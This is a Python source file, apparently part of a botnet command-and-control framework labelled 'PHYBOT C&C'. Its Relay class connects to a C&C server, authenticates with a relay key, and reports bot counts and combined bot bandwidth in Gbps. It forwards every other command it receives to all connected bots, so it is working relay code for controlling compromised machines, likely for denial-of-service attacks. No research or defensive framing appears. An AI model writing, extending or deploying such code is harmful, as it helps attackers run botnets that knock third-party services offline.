from time import sleep, asctime, localtime
from socket import (
    socket as Sock,
    SOL_SOCKET,
    SO_KEEPALIVE,
    AF_INET,
    SOCK_STREAM,
)
from .config import RelayConfig
from .core import Core

class Relay():
    def __init__(
        self, 
        core: Core,
        config: RelayConfig = RelayConfig()
    ) -> None:
        self.core = core
        self.config = config

    def update_title(
        self,
        client: Sock,
        username: str,
    ):
        while 1:
            try:
                bot_number: int = len(self.config.bots_sock)
                total_speed: int = sum(self.config.bot_speed)/125000
                actual_time: str = asctime(localtime())
                self.core.send(client, f'\33]0;{username}@PHYBOT C&C  |  Bots: {bot_number}  |  Speed: {total_speed} Gbps  |  {actual_time}\a', False)

                sleep(self.config.cnc_time.UPTITLE)

            except Exception: client.close()

    def relay(self):
        c2: Sock = Sock(AF_INET, SOCK_STREAM)
        c2.setsockopt(SOL_SOCKET, SO_KEEPALIVE, 1)

        self.core.log("relay starting...")
        while 1:
            try:
                c2.connect(self.config.cnc_addr.CNC_ADDR)
                self.core.log("relay connecting to cnc ...")

                while 1:
                    data: str = c2.recv(1024).decode()
                    self.core.log(f"relay recv: {[i for i in data]}")
                    if 'Username' in data:
                        c2.send(f'RELAY[p:{self.config.RELAY_KEY}]'.encode())
                        break

                while 1:
                    data: str = c2.recv(1024).decode()
                    if 'Password' in data:
                        c2.send(f'{self.config.RELAY_KEY}'.encode())
                        break

                self.core.log("relay connected to cnc")
                break

            except Exception:
                self.core.log("relay offline, will retry later")
                sleep(self.config.relay_time.RELAY)

        while 1:
            try:
                data: str = c2.recv(1024).decode()

                if not data: break

                self.core.log(data)

                args: list[str] = data.split(' ')
                command: str = args[0].upper()

                match command:
                    case 'RPING': c2.send(f'RPONG[p:{self.config.RELAY_KEY}]'.encode())
                    case 'RNETSPEED': c2.send(str(self.config.bot_speed).encode())
                    case 'RNETBOTS': c2.send(str(len(self.config.bots_sock)).encode())
                    case _: self.core.broadcast(data)

            except Exception: break

        c2.close()
        sleep(self.config.relay_time.RELAY)
        self.relay()
